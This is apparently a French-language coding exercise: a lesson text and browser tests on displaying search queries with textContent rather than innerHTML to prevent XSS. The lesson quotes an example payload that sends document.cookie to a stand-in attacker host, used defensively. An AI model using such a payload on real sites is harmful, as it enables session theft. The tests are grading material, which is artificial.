import type { BrowserQuestContext } from "../engine/browser.ts";
import { must } from "./_fixtures.ts";

export const title = "Texte ou HTML ?";
export const file = "src/03-text-or-html.ts";

export const lesson = `
Deux façons de mettre du contenu dans un élément :

\`\`\`
el.textContent = "<b>Dark</b>";   // affiche littéralement <b>Dark</b>
el.innerHTML   = "<b>Dark</b>";   // affiche Dark en gras : le HTML est INTERPRÉTÉ
\`\`\`

\`innerHTML\` est pratique. Il est aussi la porte d'entrée n°1 des
attaques sur le web.

## Le scénario

La barre de recherche affiche « 3 résultats pour « dark » ». Quelqu'un
tape, à la place de *dark* :

\`\`\`
<img src=x onerror="fetch('https://pirate.example/?cookie=' + document.cookie)">
\`\`\`

Si tu affiches la requête avec \`innerHTML\`, le navigateur crée l'image,
l'image ne charge pas, \`onerror\` s'exécute — avec les droits de la page.
Ça s'appelle une **XSS** (cross-site scripting), et ça figure dans le top
3 des failles depuis vingt ans.

## La règle

**Toute donnée qui vient de l'extérieur** (saisie, URL, API, base de
données) passe par \`textContent\`, jamais par \`innerHTML\`. Le navigateur
l'affiche telle quelle, balises comprises, sans les interpréter.

\`innerHTML\` reste acceptable pour du HTML **que tu as écrit toi-même**,
sans aucune donnée dedans — un gabarit fixe. Dès qu'une variable s'y
glisse, retour à \`createElement\` + \`textContent\`. (Le linter ne voit pas
celle-là. Le linter, c'est toi.)

## Mélanger du texte et un élément

Pour surligner « ar » dans « Dark », il faut *du texte*, *un \`<mark>\`*,
*du texte*. Trois nœuds, créés séparément, attachés dans l'ordre :

\`\`\`
el.append("D", mark, "k");        // append accepte des chaînes : ce sont des nœuds texte
\`\`\`

## Vider

\`el.replaceChildren()\` sans argument retire tout. (\`el.innerHTML = ""\`
marche aussi : pas de donnée, pas de risque.)
`;

export const mission = `
Dans \`src/03-text-or-html.ts\` :
- \`showResultCount(el, query, count)\` → \`« Aucun résultat pour « dark » »\`, \`« 1 résultat pour « dark » »\`, \`« 3 résultats pour « dark » »\` — sans jamais interpréter la requête
- \`clear(el)\` → plus aucun enfant
- \`highlight(el, text, query)\` → le texte, avec la première occurrence de la requête (sans tenir compte de la casse) dans un \`<mark>\`
`;

interface Module {
  showResultCount(el: HTMLElement, query: string, count: number): void;
  clear(el: Element): void;
  highlight(el: HTMLElement, text: string, query: string): void;
}

declare global {
  interface Window {
    __pirate?: boolean;
  }
}

export default function (
  { test, challenge, expect, sandbox }: BrowserQuestContext,
  m: Module,
): void {
  const zone = (): HTMLElement => must(sandbox('<p class="search-result"></p>'), "p");

  test('showResultCount(el, "dark", 3) affiche « 3 résultats pour « dark » »', () => {
    const el = zone();
    m.showResultCount(el, "dark", 3);
    expect(el.textContent).toBe("3 résultats pour « dark »");
  });

  test("le singulier et le zéro : « 1 résultat pour … », « Aucun résultat pour … »", () => {
    const el = zone();
    m.showResultCount(el, "dark", 1);
    expect(el.textContent).toBe("1 résultat pour « dark »");
    m.showResultCount(el, "dark", 0);
    expect(el.textContent).toBe("Aucun résultat pour « dark »");
  });

  test("une requête contenant du HTML est affichée telle quelle, jamais interprétée (XSS)", () => {
    const el = zone();
    delete window.__pirate;
    m.showResultCount(el, '<img src=x onerror="window.__pirate = true">', 0);
    expect(
      el.querySelector("img"),
      "une balise <img> a été créée : la requête a été interprétée",
    ).toBeNull();
    expect(el.textContent).toContain('<img src=x onerror="window.__pirate = true">');
    expect(window.__pirate).toBeUndefined();
  });

  test("clear(el) retire tous les enfants", () => {
    const el = must(
      sandbox('<ul class="track"><li class="card">a</li><li class="card">b</li></ul>'),
      "ul",
    );
    m.clear(el);
    expect(el.childElementCount).toBe(0);
    expect(el.textContent?.trim()).toBe("");
    expect(el.isConnected, "il faut vider l'élément, pas le retirer de la page").toBe(true);
  });

  test('highlight(el, "Dark", "ar") produit D<mark>ar</mark>k', () => {
    const el = zone();
    m.highlight(el, "Dark", "ar");
    expect(el.innerHTML).toBe("D<mark>ar</mark>k");
    expect(el.textContent).toBe("Dark");
  });

  test('highlight ignore la casse mais garde celle du texte : ("Arcane", "ARC") → <mark>Arc</mark>ane', () => {
    const el = zone();
    m.highlight(el, "Arcane", "ARC");
    expect(el.innerHTML).toBe("<mark>Arc</mark>ane");
  });

  test("highlight sans correspondance, ou avec une requête vide : le texte seul, sans <mark>", () => {
    const el = zone();
    m.highlight(el, "Dark", "zz");
    expect(el.innerHTML).toBe("Dark");
    m.highlight(el, "Dark", "");
    expect(el.innerHTML).toBe("Dark");
  });

  test('highlight n\'interprète pas le texte : ("<b>Dark</b>", "ar") n\'a pas de <b>', () => {
    const el = zone();
    m.highlight(el, "<b>Dark</b>", "ar");
    expect(el.querySelector("b")).toBeNull();
    expect(el.querySelector("mark")).toHaveTextContent("ar");
    expect(el.textContent).toBe("<b>Dark</b>");
  });

  test("showResultCount et highlight n'utilisent pas innerHTML", () => {
    expect([m.showResultCount, m.highlight].map((fn) => fn.toString()).join("\n")).not.toMatch(
      /innerHTML|insertAdjacentHTML|outerHTML/,
    );
  });

  challenge(
    'highlight marque TOUTES les occurrences : ("Narcos & Arcane", "ar") → N<mark>ar</mark>cos &amp; <mark>Ar</mark>cane',
    () => {
      const el = zone();
      m.highlight(el, "Narcos & Arcane", "ar");
      expect(el.innerHTML).toBe("N<mark>ar</mark>cos &amp; <mark>Ar</mark>cane");
      m.highlight(el, "aaa", "a");
      expect(el.querySelectorAll("mark")).toHaveLength(3);
    },
  );
}
